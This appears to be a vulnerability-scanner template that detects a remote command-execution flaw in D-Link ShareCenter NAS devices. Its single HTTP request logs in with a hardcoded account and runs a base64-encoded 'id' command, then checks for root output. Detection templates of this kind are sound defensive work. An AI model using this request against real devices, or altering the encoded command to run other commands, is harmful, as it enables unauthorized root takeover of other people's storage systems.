id: dlink-sharecenter-rce

info:
  name: D-Link ShareCenter Vulnerability
  author: adeljck
  severity: high
  description: |
    This template detects a vulnerability in D-Link ShareCenter models DNS-320L, DNS-325, and DNS-327L, which allows unauthorized access to sensitive system information.
  remediation: |
    To remediate this vulnerability, update the firmware of your D-Link ShareCenter to the latest version provided by D-Link. Additionally, ensure that strong, unique passwords are used for all accounts and that remote access is disabled if not needed.

http:
  - raw:
      - |
        GET /cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ= HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        X-Forwarded-For: 10.10.10.5
        X-Originating-IP: 10.10.10.5
        Priority: u=0, i

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "uid=0(root) gid=0(root)"
        part: body